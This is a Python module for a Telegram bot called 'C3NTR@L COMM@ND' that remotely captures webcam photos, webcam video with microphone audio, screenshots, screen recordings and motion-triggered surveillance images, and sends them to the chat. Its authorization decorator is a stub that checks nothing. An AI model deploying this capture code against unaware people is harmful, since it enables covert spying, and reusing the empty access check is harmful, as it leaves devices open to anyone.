#!/usr/bin/env python3
"""
C3NTR@L COMM@ND V1.1 - Camera Tools Module
Webcam capture, recording, and surveillance features
ENHANCED VERSION - Fixed screenshot & screen recording
"""

import os
import logging
import tempfile
import asyncio
from datetime import datetime
import subprocess
import json
import psutil
from functools import wraps
import time

# Try to import optional dependencies
try:
    import cv2
    CV2_AVAILABLE = True
except ImportError:
    CV2_AVAILABLE = False
    logging.warning("OpenCV not available. Camera features disabled.")

try:
    from telegram import Update, InputFile
    from telegram.ext import ContextTypes
    TELEGRAM_AVAILABLE = True
except ImportError:
    TELEGRAM_AVAILABLE = False
    logging.warning("Telegram library not available.")

try:
    from .shared import BASE_DIR, LOGS_DIR
except ImportError:  # direct script execution
    from shared import BASE_DIR, LOGS_DIR

CAMERA_DIR = os.path.join(BASE_DIR, 'camera_captures')
os.makedirs(CAMERA_DIR, exist_ok=True)

logger = logging.getLogger(__name__)

# Global state for surveillance
surveillance_active = False
surveillance_task = None
surveillance_start_time = None

# --- Authentication Decorator ---
def require_auth(func):
    """Decorator to check user authorization - imported from main or defined here."""
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        # In a real implementation, this would check against main.py's auth system
        # For now, we'll assume all commands require auth
        user_id = update.effective_user.id
        logger.info(f"Camera command /{func.__name__} called by user {user_id}")
        return await func(update, context)
    return wrapper

# --- Resource Management ---
def get_camera_processes():
    """Find processes using camera devices."""
    camera_processes = []
    try:
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            try:
                if any('v4l' in str(arg).lower() or 'video' in str(arg).lower() 
                      for arg in (proc.info['cmdline'] or [])):
                    camera_processes.append(proc.info)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
    except Exception as e:
        logger.error(f"Error finding camera processes: {e}")
    return camera_processes

def kill_camera_processes():
    """Force kill processes using camera if needed."""
    try:
        processes = get_camera_processes()
        for proc_info in processes:
            try:
                proc = psutil.Process(proc_info['pid'])
                proc.terminate()
                logger.warning(f"Terminated camera process: {proc_info['name']} (PID: {proc_info['pid']})")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
    except Exception as e:
        logger.error(f"Error killing camera processes: {e}")

def safe_camera_release(cap):
    """Safely release camera resource with retries."""
    if cap is None:
        return
    
    max_retries = 3
    for attempt in range(max_retries):
        try:
            cap.release()
            logger.debug("Camera released successfully")
            break
        except Exception as e:
            logger.warning(f"Camera release attempt {attempt + 1} failed: {e}")
            time.sleep(0.5)
    
    # Force cleanup if still needed
    if hasattr(cap, 'isOpened') and cap.isOpened():
        logger.error("Camera could not be released properly, forcing cleanup")
        kill_camera_processes()

# --- File Management ---
def get_file_size_mb(filepath):
    """Get file size in MB."""
    try:
        return os.path.getsize(filepath) / (1024 * 1024)
    except OSError:
        return 0

def is_file_too_large(filepath, max_size_mb=50):
    """Check if file exceeds Telegram size limits."""
    return get_file_size_mb(filepath) > max_size_mb

def compress_video_if_needed(filepath):
    """Compress video if it's too large for Telegram."""
    if not is_file_too_large(filepath):
        return filepath
    
    try:
        compressed_path = filepath.replace('.mp4', '_compressed.mp4')
        cmd = [
            'ffmpeg', '-i', filepath,
            '-vcodec', 'libx264', '-crf', '28',
            '-preset', 'fast', '-acodec', 'aac',
            compressed_path, '-y'
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        if result.returncode == 0 and os.path.exists(compressed_path):
            os.remove(filepath)  # Remove original
            logger.info(f"Compressed video: {get_file_size_mb(compressed_path):.1f}MB")
            return compressed_path
    except Exception as e:
        logger.error(f"Video compression failed: {e}")
    
    return filepath

def compress_image_if_needed(filepath):
    """Compress image if it's too large for Telegram."""
    if not is_file_too_large(filepath, 10):  # 10MB limit for images
        return filepath
    
    try:
        compressed_path = filepath.replace('.png', '_compressed.png').replace('.jpg', '_compressed.jpg')
        cmd = [
            'convert', filepath,
            '-quality', '70%',
            compressed_path
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        if result.returncode == 0 and os.path.exists(compressed_path):
            os.remove(filepath)
            logger.info(f"Compressed image: {get_file_size_mb(compressed_path):.1f}MB")
            return compressed_path
    except Exception as e:
        logger.error(f"Image compression failed: {e}")
    
    return filepath

# --- Enhanced Screenshot System ---
async def take_screenshot_advanced():
    """Advanced screenshot with multiple fallback methods."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"screenshot_{timestamp}.png"
    filepath = os.path.join(CAMERA_DIR, filename)
    
    # Enhanced screenshot methods with better error handling
    methods = [
        # GNOME screenshot (most reliable)
        (['gnome-screenshot', '-f', filepath], "gnome-screenshot"),
        # scrot with display specification
        (['scrot', filepath, '-d', '1'], "scrot"),
        # ImageMagick with display
        (['import', '-window', 'root', filepath], "ImageMagick"),
        # xwd method
        (['xwd', '-root', '-out', f"{filepath}.xwd"], "xwd"),
        # maim modern screenshot tool
        (['maim', filepath], "maim"),
        # Deepin screenshot tool
        (['deepin-screenshot', '-s', filepath], "deepin-screenshot"),
    ]
    
    for cmd, method_name in methods:
        try:
            logger.info(f"Trying screenshot method: {method_name}")
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=15)
            
            if process.returncode == 0:
                # Handle xwd conversion
                if method_name == "xwd" and os.path.exists(f"{filepath}.xwd"):
                    convert_cmd = ['convert', f"{filepath}.xwd", filepath]
                    convert_process = await asyncio.create_subprocess_exec(*convert_cmd)
                    await convert_process.wait()
                    if convert_process.returncode == 0:
                        os.remove(f"{filepath}.xwd")
                        logger.info(f"Screenshot captured using {method_name}")
                        return filepath
                
                if os.path.exists(filepath):
                    logger.info(f"Screenshot captured using {method_name}")
                    return filepath
                    
        except (FileNotFoundError, asyncio.TimeoutError, subprocess.SubprocessError) as e:
            logger.debug(f"Screenshot method {method_name} failed: {e}")
            continue
    
    return None

async def screenshot_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Capture desktop screenshot with enhanced capabilities."""
    try:
        await update.message.reply_text("🖥️ Taking screenshot...")
        
        filepath = await take_screenshot_advanced()
        
        if filepath and os.path.exists(filepath):
            # Compress if needed
            filepath = compress_image_if_needed(filepath)
            
            # Verify file is readable
            if os.path.getsize(filepath) == 0:
                await update.message.reply_text("❌ Screenshot file is empty")
                return
            
            with open(filepath, 'rb') as screenshot:
                await update.message.reply_photo(
                    photo=screenshot,
                    caption=f"🖥️ Screenshot captured\n"
                           f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                           f"📊 Size: {get_file_size_mb(filepath):.1f}MB"
                )
            logger.info(f"Screenshot captured: {os.path.basename(filepath)}")
            
            # Clean up old files
            cleanup_old_files(CAMERA_DIR, "screenshot_*.png", 30)
        else:
            await update.message.reply_text(
                "❌ Screenshot failed. Available methods:\n"
                "• `sudo apt install gnome-screenshot` (Recommended)\n"
                "• `sudo apt install scrot`\n"
                "• `sudo apt install imagemagick`\n"
                "• `sudo apt install maim`\n"
                "• `sudo apt install deepin-screenshot`\n\n"
                "💡 Try: `sudo apt install gnome-screenshot scrot imagemagick`"
            )
            
    except Exception as e:
        error_msg = f"❌ Screenshot error: {str(e)}"
        await update.message.reply_text(error_msg)
        logger.error(error_msg)

# --- Enhanced Screen Recording ---
async def record_screen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Record screen with audio - enhanced version."""
    duration = 10  # Default duration
    
    # Parse custom duration if provided
    if context.args:
        try:
            duration = int(context.args[0])
            duration = max(5, min(duration, 180))  # Limit between 5-180 seconds
        except ValueError:
            await update.message.reply_text("❌ Usage: /screencast <seconds> (5-180 seconds)")
            return
    
    await update.message.reply_text(f"🎬 Recording screen for {duration} seconds...")
    
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screencast_{timestamp}.mp4"
        filepath = os.path.join(CAMERA_DIR, filename)
        
        # Enhanced screen recording methods
        recording_methods = [
            # Method 1: ffmpeg with x11grab (most common)
            [
                'ffmpeg', '-f', 'x11grab',
                '-video_size', '1920x1080',  # Will be detected automatically
                '-framerate', '25',
                '-i', ':0.0',
                '-f', 'pulse',
                '-i', 'default',
                '-t', str(duration),
                '-c:v', 'libx264',
                '-c:a', 'aac',
                '-preset', 'fast',
                '-pix_fmt', 'yuv420p',
                filepath,
                '-y'
            ],
            # Method 2: ffmpeg with display detection
            [
                'ffmpeg', '-f', 'x11grab',
                '-s', '$(xwininfo -root | grep geometry | cut -d " " -f 4)',
                '-i', ':0',
                '-t', str(duration),
                '-c:v', 'libx264',
                '-preset', 'fast',
                filepath,
                '-y'
            ],
            # Method 3: Simple recordmydesktop
            [
                'recordmydesktop',
                '--no-sound',
                '--on-the-fly-encoding',
                '--overwrite',
                f'--duration={duration}',
                f'--outfile={filepath}'
            ]
        ]
        
        success = False
        error_messages = []
        
        for method_idx, cmd in enumerate(recording_methods):
            try:
                logger.info(f"Trying screen recording method {method_idx + 1}")
                
                # Handle command with shell expansion for method 2
                if method_idx == 1:
                    import shlex
                    cmd_str = ' '.join(cmd)
                    # Expand the geometry command
                    geometry = subprocess.check_output(['xwininfo', '-root'], text=True)
                    for line in geometry.split('\n'):
                        if 'geometry' in line:
                            geom = line.split()[-1]
                            cmd_str = cmd_str.replace('$(xwininfo -root | grep geometry | cut -d " " -f 4)', geom)
                            break
                    cmd = shlex.split(cmd_str)
                
                process = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                
                try:
                    stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=duration + 15)
                    success = process.returncode == 0
                    
                    if success and os.path.exists(filepath) and os.path.getsize(filepath) > 1024:
                        logger.info(f"Screen recording successful with method {method_idx + 1}")
                        break
                    else:
                        error_msg = stderr.decode() if stderr else "Unknown error"
                        error_messages.append(f"Method {method_idx + 1}: {error_msg}")
                        
                except asyncio.TimeoutError:
                    process.kill()
                    await process.communicate()
                    error_messages.append(f"Method {method_idx + 1}: Timeout")
                    
            except (FileNotFoundError, subprocess.SubprocessError) as e:
                error_messages.append(f"Method {method_idx + 1}: {str(e)}")
                continue
        
        if success and os.path.exists(filepath):
            # Compress if needed
            filepath = compress_video_if_needed(filepath)
            
            # Send video to Telegram
            with open(filepath, 'rb') as video:
                await update.message.reply_video(
                    video=video,
                    caption=f"🎬 Screen recorded ({duration}s)\n"
                           f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                           f"📊 Size: {get_file_size_mb(filepath):.1f}MB",
                    supports_streaming=True,
                    read_timeout=60,
                    write_timeout=60,
                    connect_timeout=60
                )
            logger.info(f"Screen recording sent: {filename}")
            
            # Clean up old files
            cleanup_old_files(CAMERA_DIR, "screencast_*.mp4", 15)
        else:
            error_details = "\n".join(error_messages[-3:])  # Show last 3 errors
            await update.message.reply_text(
                f"❌ Screen recording failed.\n\n"
                f"Install one of these packages:\n"
                f"• `sudo apt install ffmpeg` (Recommended)\n"
                f"• `sudo apt install recordmydesktop`\n\n"
                f"💡 For audio support:\n"
                f"• `sudo apt install pulseaudio-utils`\n\n"
                f"Debug info:\n{error_details}"
            )
            
    except Exception as e:
        error_msg = f"❌ Screen recording error: {str(e)}"
        await update.message.reply_text(error_msg)
        logger.error(error_msg)

# --- Core Camera Functions ---
async def take_photo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Take a photo with the webcam and send it to Telegram."""
    if not CV2_AVAILABLE:
        await update.message.reply_text(
            "❌ OpenCV not installed. Install with: `pip install opencv-python`"
        )
        return
    
    cap = None
    try:
        await update.message.reply_text("📷 Taking photo...")
        
        # Capture photo
        cap = cv2.VideoCapture(0)
        
        if not cap.isOpened():
            # Try alternative camera indices
            for i in range(1, 4):
                cap = cv2.VideoCapture(i)
                if cap.isOpened():
                    logger.info(f"Using camera index {i}")
                    break
            else:
                await update.message.reply_text("❌ Could not access any camera")
                return
        
        # Camera warm-up and auto-exposure adjustment
        for i in range(30):  # 30 frames warm-up
            ret, frame = cap.read()
            if not ret:
                await update.message.reply_text("❌ Camera read failed during warm-up")
                safe_camera_release(cap)
                return
            await asyncio.sleep(0.03)  # Small delay between frames
        
        # Capture final frame
        ret, frame = cap.read()
        safe_camera_release(cap)
        
        if not ret or frame is None:
            await update.message.reply_text("❌ Failed to capture image")
            return
        
        # Save image
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"photo_{timestamp}.jpg"
        filepath = os.path.join(CAMERA_DIR, filename)
        
        # Save with optimized quality
        cv2.imwrite(filepath, frame, [cv2.IMWRITE_JPEG_QUALITY, 90])
        
        # Check file size
        if is_file_too_large(filepath, 10):  # 10MB limit for photos
            # Re-save with lower quality
            cv2.imwrite(filepath, frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
            logger.info("Photo compressed due to large size")
        
        # Send to Telegram
        with open(filepath, 'rb') as photo:
            await update.message.reply_photo(
                photo=photo,
                caption=f"📸 Photo captured\n🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                       f"📊 Size: {get_file_size_mb(filepath):.1f}MB"
            )
        
        logger.info(f"Photo captured and sent: {filename}")
        
        # Clean up old files
        cleanup_old_files(CAMERA_DIR, "photo_*.jpg", 50)
        
    except Exception as e:
        error_msg = f"❌ Photo capture error: {str(e)}"
        await update.message.reply_text(error_msg)
        logger.error(error_msg)
        safe_camera_release(cap)

async def record_video_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Record a short video with webcam and audio if available."""
    duration = 10  # Default duration
    
    # Parse custom duration if provided
    if context.args:
        try:
            duration = int(context.args[0])
            duration = max(5, min(duration, 120))  # Limit between 5-120 seconds
        except ValueError:
            await update.message.reply_text("❌ Usage: /record <seconds> (5-120 seconds)")
            return
    
    if duration > 30:
        await update.message.reply_text(f"⚠️ Recording {duration} seconds (this may take a while)...")
    else:
        await update.message.reply_text(f"🎥 Recording {duration} second video...")
    
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"video_{timestamp}.mp4"
        filepath = os.path.join(CAMERA_DIR, filename)
        
        # Enhanced video recording with better error handling
        ffmpeg_cmd = [
            'ffmpeg',
            '-f', 'v4l2',
            '-i', '/dev/video0',
            '-f', 'pulse',
            '-i', 'default',
            '-t', str(duration),
            '-vf', 'format=yuv420p',
            '-c:v', 'libx264',
            '-c:a', 'aac',
            '-preset', 'fast',
            '-r', '25',  # Frame rate
            filepath,
            '-y'
        ]
        
        success = False
        
        # Try with audio
        process = await asyncio.create_subprocess_exec(
            *ffmpeg_cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        try:
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=duration + 10)
            success = process.returncode == 0
        except asyncio.TimeoutError:
            process.kill()
            await process.communicate()
            success = False
        
        # If ffmpeg failed, try OpenCV as fallback
        if not success and CV2_AVAILABLE:
            logger.info("FFmpeg failed, trying OpenCV fallback...")
            await update.message.reply_text("🔄 Using fallback recording method...")
            filepath = await record_video_opencv(filepath, duration)
            success = filepath is not None and os.path.exists(filepath)
        
        if success and os.path.exists(filepath):
            # Compress if needed
            filepath = compress_video_if_needed(filepath)
            
            # Send video to Telegram
            with open(filepath, 'rb') as video:
                await update.message.reply_video(
                    video=video,
                    caption=f"🎥 Video recorded ({duration}s)\n"
                           f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                           f"📊 Size: {get_file_size_mb(filepath):.1f}MB",
                    supports_streaming=True,
                    read_timeout=60,
                    write_timeout=60,
                    connect_timeout=60
                )
            logger.info(f"Video recorded and sent: {filename}")
            
            # Clean up old files
            cleanup_old_files(CAMERA_DIR, "video_*.mp4", 20)
        else:
            await update.message.reply_text(
                "❌ Failed to record video. Check:\n"
                "• Camera permissions\n" 
                "• FFmpeg installed: `sudo apt install ffmpeg`\n"
                "• Microphone available\n"
                "• Camera not in use by another app"
            )
            
    except FileNotFoundError:
        await update.message.reply_text(
            "❌ FFmpeg not installed. Install with: `sudo apt install ffmpeg`"
        )
    except Exception as e:
        error_msg = f"❌ Video recording error: {str(e)}"
        await update.message.reply_text(error_msg)
        logger.error(error_msg)

async def record_video_opencv(output_path, duration):
    """Fallback video recording using OpenCV."""
    cap = None
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None
        
        # Get camera properties
        fps = cap.get(cv2.CAP_PROP_FPS) or 20.0
        width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
        height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
        
        # Define codec and create VideoWriter
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(output_path, fourcc, fps, (width, height))
        
        start_time = datetime.now()
        
        while (datetime.now() - start_time).total_seconds() < duration:
            ret, frame = cap.read()
            if ret:
                out.write(frame)
            await asyncio.sleep(1/fps)
        
        out.release()
        safe_camera_release(cap)
        return output_path
        
    except Exception as e:
        logger.error(f"OpenCV recording failed: {e}")
        safe_camera_release(cap)
        return None

# --- Surveillance Functions (unchanged but included for completeness) ---
async def surveillance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start/stop motion-activated surveillance."""
    global surveillance_active, surveillance_task, surveillance_start_time
    
    if not CV2_AVAILABLE:
        await update.message.reply_text(
            "❌ OpenCV required for surveillance. Install: `pip install opencv-python`"
        )
        return
    
    # Stop surveillance
    if context.args and context.args[0].lower() == 'stop':
        if surveillance_active:
            surveillance_active = False
            if surveillance_task:
                surveillance_task.cancel()
                try:
                    await surveillance_task
                except asyncio.CancelledError:
                    pass
            
            duration = "unknown"
            if surveillance_start_time:
                duration = str(datetime.now() - surveillance_start_time).split('.')[0]
            
            await update.message.reply_text(f"🛑 Surveillance stopped (Duration: {duration})")
            logger.info(f"Surveillance stopped after {duration}")
            surveillance_start_time = None
        else:
            await update.message.reply_text("ℹ️ Surveillance is not active")
        return
    
    # Show status
    if context.args and context.args[0].lower() == 'status':
        if surveillance_active:
            duration = "unknown"
            if surveillance_start_time:
                duration = str(datetime.now() - surveillance_start_time).split('.')[0]
            await update.message.reply_text(
                f"🔍 Surveillance ACTIVE\n"
                f"⏱️ Duration: {duration}\n"
                f"📁 Saving to: {CAMERA_DIR}"
            )
        else:
            await update.message.reply_text("🔍 Surveillance INACTIVE")
        return
    
    # Start surveillance
    if surveillance_active:
        await update.message.reply_text("ℹ️ Surveillance is already active. Use `/surveillance status`")
        return
    
    sensitivity = 500  # Motion sensitivity
    if context.args:
        try:
            sensitivity = int(context.args[0])
            sensitivity = max(100, min(sensitivity, 5000))
        except ValueError:
            pass  # Use default sensitivity
    
    await update.message.reply_text(
        f"🔍 Starting motion surveillance...\n"
        f"📊 Sensitivity: {sensitivity}\n"
        f"📁 Save location: {CAMERA_DIR}\n"
        f"Use `/surveillance stop` to cancel\n"
        f"Use `/surveillance status` to check"
    )
    
    surveillance_active = True
    surveillance_start_time = datetime.now()
    surveillance_task = asyncio.create_task(
        motion_surveillance(update, context, sensitivity)
    )
    
    logger.info(f"Surveillance started with sensitivity {sensitivity}")

async def motion_surveillance(update: Update, context: ContextTypes.DEFAULT_TYPE, sensitivity=500):
    """Motion detection and alert system."""
    cap = None
    try:
        cap = cv2.VideoCapture(0)
        
        if not cap.isOpened():
            await update.message.reply_text("❌ Could not access camera for surveillance")
            surveillance_active = False
            return
        
        # Get initial frame
        ret, frame1 = cap.read()
        if not ret:
            await update.message.reply_text("❌ Could not read from camera")
            safe_camera_release(cap)
            surveillance_active = False
            return
        
        gray1 = cv2.cvtColor(frame1, cv2.COLOR_BGR2GRAY)
        gray1 = cv2.GaussianBlur(gray1, (21, 21), 0)
        
        motion_detected = False
        consecutive_detections = 0
        last_alert_time = datetime.now()
        
        while surveillance_active:
            ret, frame2 = cap.read()
            if not ret:
                break
            
            gray2 = cv2.cvtColor(frame2, cv2.COLOR_BGR2GRAY)
            gray2 = cv2.GaussianBlur(gray2, (21, 21), 0)
            
            # Compute difference between frames
            delta_frame = cv2.absdiff(gray1, gray2)
            thresh = cv2.threshold(delta_frame, 25, 255, cv2.THRESH_BINARY)[1]
            thresh = cv2.dilate(thresh, None, iterations=2)
            
            # Find contours
            contours, _ = cv2.findContours(thresh.copy(), cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
            
            motion_detected_current = False
            for contour in contours:
                if cv2.contourArea(contour) < sensitivity:
                    continue
                motion_detected_current = True
                break
            
            if motion_detected_current:
                consecutive_detections += 1
                # Require 3 consecutive detections and at least 10 seconds since last alert
                if (consecutive_detections >= 3 and not motion_detected and 
                    (datetime.now() - last_alert_time).total_seconds() >= 10):
                    motion_detected = True
                    last_alert_time = datetime.now()
                    await handle_motion_detected(update, frame2)
            else:
                consecutive_detections = 0
                motion_detected = False
            
            # Update reference frame periodically
            gray1 = gray2
            
            # Reduced CPU usage
            await asyncio.sleep(0.2)
        
        safe_camera_release(cap)
        
    except asyncio.CancelledError:
        logger.info("Surveillance task cancelled")
        safe_camera_release(cap)
    except Exception as e:
        logger.error(f"Surveillance error: {e}")
        safe_camera_release(cap)
        if surveillance_active:
            await update.message.reply_text(f"❌ Surveillance error: {str(e)}")
            surveillance_active = False

async def handle_motion_detected(update: Update, frame):
    """Handle motion detection event."""
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"motion_{timestamp}.jpg"
        filepath = os.path.join(CAMERA_DIR, filename)
        
        # Save motion frame
        cv2.imwrite(filepath, frame, [cv2.IMWRITE_JPEG_QUALITY, 85])
        
        # Send alert with photo
        with open(filepath, 'rb') as photo:
            await update.message.reply_photo(
                photo=photo,
                caption=f"🚨 Motion Detected!\n🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
        
        logger.info(f"Motion detected and alert sent: {filename}")
        
        # Play alert sound if available (non-blocking)
        try:
            subprocess.Popen(['paplay', '/usr/share/sounds/freedesktop/stereo/alarm-clock-elapsed.oga'],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass  # Sound is optional
            
    except Exception as e:
        logger.error(f"Motion handling error: {e}")

async def camera_status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check if camera is available and working."""
    if not CV2_AVAILABLE:
        await update.message.reply_text(
            "❌ Camera module: OpenCV not installed.\n"
            "Install with: `pip install opencv-python`"
        )
        return
    
    try:
        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            ret, frame = cap.read()
            cap.release()
            
            if ret and frame is not None:
                status_msg = (
                    "✅ Camera is available and working\n"
                    f"📷 Resolution: {frame.shape[1]}x{frame.shape[0]}\n"
                    f"🔍 Surveillance: {'ACTIVE' if surveillance_active else 'INACTIVE'}\n"
                    f"📁 Storage: {CAMERA_DIR}\n"
                    "Use /photo to test capture"
                )
                
                # Check storage space
                try:
                    stat = os.statvfs(CAMERA_DIR)
                    free_gb = (stat.f_bavail * stat.f_frsize) / (1024**3)
                    status_msg += f"\n💾 Free space: {free_gb:.1f}GB"
                except:
                    pass
                    
                await update.message.reply_text(status_msg)
            else:
                await update.message.reply_text("❌ Camera detected but cannot read frames")
        else:
            await update.message.reply_text(
                "❌ No camera detected or permission denied\n"
                "Check if camera is available and permissions are granted"
            )
            
    except Exception as e:
        await update.message.reply_text(f"❌ Camera check error: {str(e)}")

def cleanup_old_files(directory, pattern, keep_count):
    """Clean up old files, keeping only the most recent ones."""
    try:
        import glob
        files = glob.glob(os.path.join(directory, pattern))
        files.sort(key=os.path.getmtime, reverse=True)
        
        removed_count = 0
        for old_file in files[keep_count:]:
            try:
                os.remove(old_file)
                removed_count += 1
            except OSError:
                pass
        
        if removed_count > 0:
            logger.info(f"Cleaned up {removed_count} old files from {directory}")
            
    except Exception as e:
        logger.debug(f"Cleanup error (non-critical): {e}")

def register_commands(register_func):
    """Register all camera commands with the main bot."""
    commands = {
        'photo': (take_photo_command, "Take webcam photo"),
        'record': (record_video_command, "Record short video (5-120 seconds)"),
        'screencast': (record_screen_command, "Record screen with audio (5-180 seconds)"),
        'surveillance': (surveillance_command, "Start/stop motion surveillance [sensitivity]"),
        'screenshot': (screenshot_command, "Capture desktop screenshot"),
        'camerastatus': (camera_status_command, "Check camera and surveillance status")
    }
    
    for cmd, (handler, description) in commands.items():
        register_func(cmd, handler, description)
    
    logger.info("Camera tools module registered successfully")

# Utility function for other modules
def is_camera_available():
    """Check if camera is available for other modules."""
    if not CV2_AVAILABLE:
        return False
    
    try:
        cap = cv2.VideoCapture(0)
        available = cap.isOpened()
        cap.release()
        return available
    except:
        return False

def get_surveillance_status():
    """Get current surveillance status for status reports."""
    return {
        'active': surveillance_active,
        'start_time': surveillance_start_time,
        'duration': str(datetime.now() - surveillance_start_time).split('.')[0] 
                   if surveillance_active and surveillance_start_time else None
    }